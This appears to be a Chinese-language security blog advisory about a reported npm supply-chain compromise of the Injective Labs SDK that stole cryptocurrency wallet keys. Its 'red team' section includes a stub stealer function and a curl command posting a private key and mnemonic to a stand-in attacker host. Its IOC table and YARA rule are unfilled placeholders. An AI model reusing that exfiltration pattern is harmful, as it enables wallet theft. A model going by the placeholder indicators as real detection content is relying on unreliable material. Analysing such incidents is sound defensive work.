---
layout: post
title:  "Injective SDK on npm infected with cryptocurrency wallet stealer"
date:   2026-07-10 02:13:49 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Injective Labs SDK 的供應鏈攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (敏感資訊洩露)
> * **關鍵技術**: `npm` 供應鏈攻擊、`TypeScript`/`JavaScript` 程式碼注入、`Cryptocurrency` 錢包私鑰竊取

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者透過 GitHub 資料庫的供應鏈攻擊，將惡意程式碼注入 `@injectivelabs/sdk-ts` 套件中，進而影響使用此套件的應用程式。
* **攻擊流程圖解**:
  1. 攻擊者取得 Injective Labs SDK 的 GitHub 資料庫存取權。
  2. 攻擊者提交惡意程式碼至 `@injectivelabs/sdk-ts` 套件。
  3. 惡意套件被發佈至 npm。
  4. 開發人員下載並使用惡意套件。
  5. 惡意程式碼被執行，竊取使用者錢包私鑰和助記詞。
* **受影響元件**: `@injectivelabs/sdk-ts` 套件版本 1.20.21。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得 Injective Labs SDK 的 GitHub 資料庫存取權。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意程式碼範例
      const stealWalletInfo = () => {
        //竊取錢包私鑰和助記詞
        const privateKey = getPrivateKey();
        const mnemonic = getMnemonic();
        // 將竊取的資訊發送至攻擊者控制的伺服器
        sendInfoToAttacker(privateKey, mnemonic);
      };
    
    ```
  *範例指令*: 使用 `curl` 發送 HTTP 請求至攻擊者控制的伺服器。

```

bash
  curl -X POST \
  https://attacker-server.com/steal-info \
  -H 'Content-Type: application/json' \
  -d '{"privateKey": "私鑰", "mnemonic": "助記詞"}'

```
* **繞過技術**: 攻擊者可能使用各種技術來繞過安全防護，例如使用加密或編碼來隱藏惡意程式碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `惡意套件的哈希值` |
| IP | `攻擊者控制的伺服器 IP` |
| Domain | `攻擊者控制的伺服器域名` |
| File Path | `惡意套件的檔案路徑` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule detect_malicious_package {
        meta:
          description = "偵測惡意套件"
          author = "您的名字"
        strings:
          $a = "惡意套件的特徵字串"
        condition:
          $a
      }
    
    ```
  或者使用 SIEM 查詢語法進行偵測。
* **緩解措施**: 更新 `@injectivelabs/sdk-ts` 套件至最新版本，檢查並移除任何惡意程式碼。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意程式碼或資料被注入軟體供應鏈中的任何一環，例如開發、測試、發佈等階段。
* **npm (Node Package Manager)**: Node.js 的套件管理工具，允許開發人員輕鬆地安裝和管理套件。
* **TypeScript/JavaScript**: 用於開發 Web 應用程式的程式語言。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/injective-sdk-on-npm-infected-with-cryptocurrency-wallet-stealer/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


